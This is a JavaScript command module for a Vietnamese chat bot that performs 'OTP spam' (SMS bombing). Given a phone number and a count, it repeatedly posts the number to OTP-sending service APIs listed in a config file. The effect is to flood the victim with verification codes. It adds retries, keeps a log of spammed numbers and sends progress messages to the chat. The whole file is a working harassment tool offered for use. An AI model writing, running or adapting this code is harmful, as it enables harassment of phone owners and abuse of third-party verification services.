const axios = require("axios");
const fs = require("fs");
const path = require("path");
const chalk = require("chalk");
const Table = require("cli-table3");

module.exports.config = {
    name: "spam",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "DuongKhang",
    description: "Spam OTP",
    commandCategory: "Spam",
    cooldowns: 3,
    usePrefix: false
};

// Cấu hình bot
let isSpamming = false;
const settings = {
    minDelay: 1000,   
    maxDelay: 5000,   
    retryLimit: 3,     
    logFile: path.join(__dirname, "otp_spam_logs.txt"),
    storageFile: path.join(__dirname, "spam_data.json"),
    cleanupInterval: 24 * 60 * 60 * 1000, 
};

// Kiểm tra và tải API config từ file api_config.json
let apiConfig = {};
if (fs.existsSync(path.join(__dirname, "api_config.json"))) {
    apiConfig = JSON.parse(fs.readFileSync(path.join(__dirname, "api_config.json"), "utf8"));
}

if (!apiConfig.services || apiConfig.services.length === 0) {
    console.error("❌ Không có dịch vụ nào trong cấu hình. Vui lòng kiểm tra lại tệp api_config.json.");
    process.exit(1);
}

// Load dữ liệu spam từ file
const loadSpammedPhones = () => fs.existsSync(settings.storageFile)
    ? JSON.parse(fs.readFileSync(settings.storageFile, "utf8"))
    : {};

// Lưu dữ liệu spam
const saveSpammedPhones = (spammedPhones) => 
    fs.writeFileSync(settings.storageFile, JSON.stringify(spammedPhones, null, 2));

// Dọn dẹp số spam sau 24h
const cleanupSpammedPhones = () => {
    let spammedPhones = loadSpammedPhones();
    const now = Date.now();
    let count = 0;

    for (let phone in spammedPhones) {
        if (now - spammedPhones[phone].timestamp >= settings.cleanupInterval) {
            delete spammedPhones[phone];
            count++;
        }
    }

    saveSpammedPhones(spammedPhones);
    if (count > 0) console.log(`🗑 Đã xoá ${count} số spam cũ.`);
};

// Chạy dọn dẹp mỗi 24h
setInterval(cleanupSpammedPhones, settings.cleanupInterval);

// Ghi log
const logMessage = (message, level = "info") => {
    const timestamp = new Date().toISOString();
    const formattedMessage = `[${timestamp}] ${level.toUpperCase()}: ${message}`;
    console.log(formattedMessage);
    fs.appendFileSync(settings.logFile, formattedMessage + "\n");
};

// Hàm tạo bảng với khung nhỏ gọn và chuyên nghiệp
const printLogWithTable = (phone, service, status, httpCode) => {
    const table = new Table({
        head: [
            chalk.bgCyan.black('Phone'), 
            chalk.bgMagenta.black('Service'), 
            chalk.bgGreen.black('Status'), 
            chalk.bgYellow.black('HTTP')
        ],
        colWidths: [15, 15, 10, 8], 
        style: {
            head: ['bold'],
            border: ['grey'],
            compact: true, 
            'padding-left': 0,  
            'padding-right': 0, 
        },
        chars: {
            'top': '─', 'top-mid': '┬', 'top-left': '┌', 'top-right': '┐',
            'bottom': '─', 'bottom-mid': '┴', 'bottom-left': '└', 'bottom-right': '┘',
            'left': '│', 'left-mid': '├', 'right': '│', 'right-mid': '┤',
            'middle': '─'
        }
    });

    table.push([
        chalk.bgBlue.white(phone),  
        chalk.bgYellow.black(service),  
        status === 'Success' ? chalk.bgGreen.white(status) : chalk.bgRed.white(status),  
        httpCode === 200 ? chalk.bgGreen.white(httpCode) : chalk.bgRed.white(httpCode)  
    ]);

    console.log(table.toString()); 
};

// Gửi OTP cho từng dịch vụ
const sendOtpToService = async (phone, service, spamCount) => {
    let success = false;
    for (let retries = 0; retries < settings.retryLimit; retries++) {
        try {
            const response = await axios.post(service.apiUrl, { phone }, {
                headers: { Authorization: `Bearer ${service.token}` }
            });
            const status = response.data.status === "success" ? "Success" : "Failed";
            const httpCode = response.status;
            printLogWithTable(phone, service.name, status, httpCode); 

            if (response.data.status === "success") {
                console.log(`✅ [${phone}] | ${service.name}: Spam ${spamCount} lần thành công`);
                success = true;
                break;
            } else {
                console.log(`⚠️ [${phone}] | ${service.name}: Spam ${spamCount} lần thất bại - ${response.data.message}`);
            }
        } catch (error) {
            console.log(`❌ [${phone}] | ${service.name}: Spam ${spamCount} lần lỗi - ${error.message}`);
        }
    }
    return success;
};

// Chạy spam tự động
const autoSpam = async (spamData, api, threadID) => {
    isSpamming = true;
    let spammedPhones = loadSpammedPhones();
    const startTime = Date.now();

    api.sendMessage(`
        🚀 **Quá trình Spam OTP đã được khởi động!**
        
        📅 **Thời gian bắt đầu:** ${new Date(startTime).toLocaleString()}
        📱 **Số điện thoại:** ${Object.keys(spamData).join(", ")}
        🔄 **Số lần Spam:** ${Object.values(spamData).join(", ")}
        
        Đang tiến hành gửi OTP. Xin vui lòng theo dõi thông tin trong console.
    `, threadID);

    logMessage(`🚀 Bắt đầu spam OTP cho ${Object.keys(spamData).length} số điện thoại.`);

    for (let phone in spamData) {
        let spamCount = spamData[phone];

        if (!spammedPhones[phone]) {
            spammedPhones[phone] = { count: 0, timestamp: Date.now() };
        }

        // Chạy spam cho mỗi dịch vụ
        for (let i = 0; i < spamCount; i++) {
            if (!isSpamming) return;

            const service = apiConfig.services[0]; 

            await sendOtpToService(phone, service, spamCount);
            spammedPhones[phone].count++;
        }

        saveSpammedPhones(spammedPhones);
    }

    const endTime = Date.now();
    const totalTime = ((endTime - startTime) / 1000).toFixed(2); 

    api.sendMessage(`
        ✅ **Quá trình Spam OTP đã hoàn tất!**
        
        📅 **Thời gian hoàn thành:** ${new Date(endTime).toLocaleString()}
        ⏱ **Tổng thời gian spam:** ${totalTime} giây
        📱 **Số điện thoại đã spam:** ${Object.keys(spamData).join(", ")}
        🔁 **Tổng số lần spam:** ${Object.values(spamData).reduce((a, b) => a + b, 0)}
        
        Cảm ơn bạn đã sử dụng dịch vụ!
    `, threadID);

    logMessage("✅ **Hoàn tất quá trình spam OTP**.");
};

// Lệnh menu hướng dẫn sử dụng
const showMenu = () => {
    console.log(`
    🌐 **Hướng dẫn sử dụng:**
    1. Gửi số điện thoại và số lần spam trong định dạng sau:
       Example: !spam [Số điện thoại] [Số lần spam]
    2. Bot sẽ tự động gửi OTP cho số điện thoại và hiển thị tiến trình.
    3. Để dừng spam, bạn có thể sử dụng lệnh !stop.
    4. Lệnh menu sẽ hiển thị hướng dẫn cách sử dụng.
    5. Nếu cần trợ giúp, hãy liên hệ admin.
    `);
};

// Lệnh để bắt đầu spam
const startSpam = async (args, api, threadID) => {
    const phone = args[0];
    const spamCount = parseInt(args[1]);
    const spamData = {};
    spamData[phone] = spamCount;

    logMessage(`🔥 Bắt đầu spam OTP cho số điện thoại: ${phone} (${spamCount} lần spam).`);
    autoSpam(spamData, api, threadID);
};

// Lệnh để dừng spam
const stopSpam = async (api, threadID) => {
    if (isSpamming) {
        isSpamming = false;
        api.sendMessage("🛑 **Quá trình spam đã bị dừng lại**. Cảm ơn bạn đã sử dụng dịch vụ!", threadID);
        logMessage("🛑 Quá trình spam đã dừng lại.");
    } else {
        api.sendMessage("❌ Không có quá trình spam nào đang chạy!", threadID);
    }
};

// Lắng nghe lệnh
module.exports.run = async (api, threadID, messageID, args) => {
    if (!args || args.length === 0) {
        showMenu();
    } else if (args[0] === "stop") {
        stopSpam(api, threadID);
    } else if (args.length === 2 && !isNaN(args[1])) { // Kiểm tra args[1] là số
        startSpam(args, api, threadID);
    } else {
        api.sendMessage("⚠️ Lệnh không hợp lệ. Vui lòng kiểm tra lại cú pháp.", threadID);
    }
};